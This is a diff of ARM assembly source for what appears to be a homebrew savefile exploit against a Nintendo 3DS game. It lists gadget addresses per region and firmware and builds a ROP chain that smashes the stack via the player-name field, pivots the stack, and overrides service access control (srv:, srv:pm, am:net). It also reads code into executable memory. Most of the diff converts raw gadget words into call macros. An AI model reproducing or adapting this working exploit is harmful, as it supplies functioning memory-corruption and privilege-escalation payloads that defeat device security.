@@ -49,26 +49,7 @@
 #error Invalid region.
 #endif
 
-#if REGION!=0//Non-JPN
-/*#define RDSAVEBEGINADR 0x324eac+4
-#define WRSAVEBEGINADR 0x2e613c+4
-#define SAVECTXDESTORYADR 0x31b99c+0xc*/
-//#define FSUMNTADR 0x2fbfa8+4
-
-#define BLXR6 0x2c45e0 //Executes "blx r6", increments r4, then if r4>=16 executes vpop {d8}, pop {r4, r5, r6, r7, r8, r9, sl, pc}
-#else//JPN
-/*#define RDSAVEBEGINADR 0x3249c4+4
-#define WRSAVEBEGINADR 0x2e5c54+4
-#define SAVECTXDESTORYADR 0x31b4b4+0xc*/
-//#define FSUMNTADR 0x2fbac0
-
-#define BLXR6 0x2c40f8
-#endif
-
-#define REGPOPADR 0x4a5c80 //Addr of this instruction: "pop {r0, r1, r2, r3, r4, r5, r6, fp, ip, pc}"
-//#define REGPOPR0R3SL 0x4a8964 //Addr of this instruction: "pop {r0, r1, r2, r3, sl, ip, pc}"
 #define REGPOPR5R6 0x4b7cb0 //Addr of this instruction: "pop {r5, r6, pc}"
-//#define STACKMEMCPYADR 0x1aa988
 
 #define RSAINFO_OFF 0x880+0x40
 
@@ -112,9 +93,6 @@
 
 #define PSPS_SIGBUFSIZE 0x7440//This is for FW1F. FW0B=0xD9B8.
 
-//#define START_ROPTHREAD
-//#define THREADSTART_ROPCHAINOFF 0x13dc
-
 #if EXECHAX==3
 //These addresses are for FW1F.
 #define HEAPHAX_HEAPCTX 0x80a2e80
@@ -128,38 +106,13 @@
 #endif
 
 .macro SENDCMD HANDLE, CMDID, BUF
-.word REGPOPADR
-.word 0, 0, 0 @ r0-r2
-.word ROPBUF+0x1040 @ r3
-.word 0x0f @ r4
-.word 0 @ r5
-.word GETTHREADSTORAGE @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6
+CALLFUNC_NOSP GETTHREADSTORAGE, 0, 0, 0, ROPBUF+0x1040
 
 .word 0 @ r4 popped by GETTHREADSTORAGE
 
-.word 0, 0 @ d8
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ r7
-.word 0 @ r8
-.word 0 @ r9
-.word 0 @ sl
-.word REGPOPADR
+ROP_LOADR0_FROMADDR ROPBUF+0x1044
 
-.word ROPBUF+0x1044 @ r0
-.word 0x20 @ r1
-.word 0 @ r2
-.word 0 @ r3
-.word 0x10 @ r4
-.word 0 @ r5
-.word ROP_LDR_R0FROMR0 @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6
+ROP_SETR1 0x20
 
 .word POP_R4R5R6PC
 
@@ -223,19 +176,6 @@ _start:
 .word 0x253060
 
 @ This is the word which overwrites the saved LR with the stack-smash, thus this is the start of the ROP-chain. This is located at offset 0x14c in the savefile, relative to the playername string it's +0x130.
-/*.word REGPOPADR
-.word 0 @ r0: Doesn't matter here, since the code jumped to immediately does "mov r0, sp".
-#ifndef START_ROPTHREAD
-.word ROPBUF + (ropstackstart - _start) @ r1: Buffer which will be copied to stack.
-.word 0x700 @ r2: Size of data to copy.
-#else
-.word ROPBUF+THREADSTART_ROPCHAINOFF @ r1: Src buffer
-.word 0x80 @ r2
-#endif
-.word 0 @ r3
-.word ROPBUF @ r4
-.word 0, 0, 0, 0
-.word STACKMEMCPYADR @ After copying the data to stack, this func calls L_3508b8, see the end of this .s.*/
 
 .word ROP_POPR3_ADDSPR3_POPPC @ Stack-pivot to ropstackstart.
 .word (ROPBUF + (ropstackstart - _start)) - (0x0ffffcc0+0x4)
@@ -244,17 +184,8 @@ _start:
 ropstackstart:
 
 #ifdef REPLACE_SRVACCESSCONTROL
-.word REGPOPADR
-.word 0x00558ad4 @ r0, Ptr to the "srv:" handle.
-.word 0 @ r1
-.word 0 @ r2
-.word 0 @ r3
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word CLOSEHANDLE
+@ r0 = Address of the "srv:" handle(0x00558ad4).
+CALLFUNC_NOSP CLOSEHANDLE, 0x00558ad4, 0, 0, 0
 
 .word 0 @ r4
 
@@ -264,16 +195,10 @@ CALLFUNC_NOSP svcConnectToPort, 0x00558ad4, 0x4e7485, 0, 0
 
 COND_THROWFATALERR
 
-.word REGPOPADR
-.word 0 @ r0
-.word 0 @ r1
-.word 0 @ r2
-.word 0 @ r3
+.word POP_R4R5R6PC
 .word 0 @ r4
 .word 0 @ r5
 .word ROPBUF+0x13bc @ r6
-.word 0 @ fp
-.word 0 @ ip
 .word srvinit_RegisterClient
 
 .word ROPBUF+0x13bc @ r3/sp0
@@ -282,17 +207,7 @@ COND_THROWFATALERR
 .word 0 @ r6
 .word 0 @ r7
 
-.word REGPOPADR
-.word ROPBUF+0x1080 @ r0
-.word 0xffff8001 @ r1
-.word 0 @ r2
-.word 0 @ r3
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word GETPROCID
+CALLFUNC_NOSP GETPROCID, ROPBUF+0x1080, 0xffff8001, 0, 0
 
 .word 0, 0, 0
 
@@ -346,32 +261,11 @@ SENDCMD ROPBUF+0x1040, 0x00190040, ROPBUF+0x1200 @ ReloadDBS
 #if EXECHAX==1 //This code exec method reads save00.bin to .text. This only works prior to system version 4.0.0-7, with FW1D/4.0.0-7 this causes a kernel panic.
 CALLFUNC_NOSP FS_MountSavedata, (ROPBUF + (savedata_archivename - _start)), 0, 0, 0
 
-.word 0, 0, 0
-/*.word REGPOPADR
-.word ROPBUF+0x1000 @ r0, File path
-.word 0x2cd2b4 @ r1, Buffer
-.word ARM11CODE_OFF+ARM11CODE_SIZE @ r2, Size
-.word 0 @ r3
-.word 0, 0, 0, 0, 0
-.word RDSAVEBEGINADR
-
-.word 0, 0, 0, 0, 0, 0, 0
-.word SAVECTXDESTORYADR
-
-.word 0*/
-
 CALLFUNC_NOSP IFile_Open, ROPBUF+0x1044, ROPBUF+0x1000, 1, 0
 
 CALLFUNC_NOSP IFile_Read, ROPBUF+0x1044, ROPBUF+0x1048, 0x2cd2b4, ARM11CODE_OFF+ARM11CODE_SIZE
 
 ROPMACRO_IFile_Close ROPBUF+0x1044
-
-/*.word REGPOPADR
-.word 0x3071d8
-.word 0, 0, 0
-.word 0, 0, 0, 0, 0
-.word FSUMNTADR
-.word 0, 0, 0, 0, 0, 0*/
 
 .word 0x2cd2b4+ARM11CODE_OFF
 #endif
@@ -383,14 +277,6 @@ ropkit_cmpobject:
 .word (ROPBUF + (ropkit_cmpobject - _start) + 0x4) @ Vtable-ptr
 .fill (0x40 / 4), 4, ROP_POPR3_ADDSPR3_POPPC @ Vtable
 #endif
-
-/*.word REGPOPADR
-.word 0x5ae878
-.word 0x0
-.word 0x2
-.word 0x0
-.word 0x0, 0x0, 0x0, 0x0, 0x0
-.word THROWFATALERR+0x18 @ Display the "gamecard was removed" error screen, where you can return to home menu instead of completely shutting down.*/
 
 #if EXECHAX==0
 .space (_start + RSAINFO_OFF) - . @ ps:ps RSA ctx
@@ -679,12 +565,6 @@ savedata_archivename:
 .align 2
 #endif
 
-/*.space (_start + 0x1050) - .
-.word ROPBUF+0x1054
-.word ROPBUF+0x1058
-.word 0, 0, 0, 0
-.word REGPOPR0R3SL*/
-
 #ifdef REPLACE_SRVACCESSCONTROL
 .space (_start + 0x1080) - . @ srv:pm cmd
 .word 0 @ ProcessID
@@ -722,30 +602,10 @@ savedata_archivename:
 .space (_start + 0x1200) - . @ cmd data for am:net command 0x00190040 ReloadDBS.
 .word 1 @ Mediatype = SD
 #endif
-/*
-.space (_start + 0x1280) - .
-@ The r1, r2, and r3 passed to L_3508b8 from STACKMEMCPYADR are loaded from here, with r4+0x1000+0x280. r2/r3 are unused however. L_3508b8 calls vtable funcptr +4 from the inr1 class.
-.word ROPBUF+0x128c @ r1, ptr to class.
-.word 0, 0
 
-.word ROPBUF+0x1290 @ Ptr to class vtable.
-.word 0 @ The first vtable funcptr is unused by L_3508b8.
-.word POP_R4FPPC @ Pop the data off the stack which was pushed by L_3508b8, and additionally pop the first word of data which was copied to the stack with memcpy32 into PC.
-*/
 .space (_start + 0x13bc) - .
 .word 2012, 10, 22 @ Datetime displayed on the save-file select screen.
 .word 13, 8
-
-/*#ifdef START_ROPTHREAD
-.space (_start + THREADSTART_ROPCHAINOFF) - .
-@ Create a thread for running the main ROP. Thread creation is used here since a stack-pivot isn't possible under oot3d with an *absolute* address for sp. Copying more ROP to <current sp> from here isn't an option either, since the ROP-chains(or at least some of them) would be too large for the stack.
-
-CALLFUNC svcCreateThread, ROPBUF+0x104c, ROP_POPPC, 0, (ROPBUF + (ropstackstart - _start)), 0x2d, -1, 0, 0
-
-.word ROP_POPR3_ADDSPR3_POPPC
-
-.word 0xfffffff8 @ Lame infinite-loop, since JPN-region game doesn't have any ARM/thumb branch instructions for infinite loop.
-#endif*/
 
 .space (_start + 0x14dc) - .
 
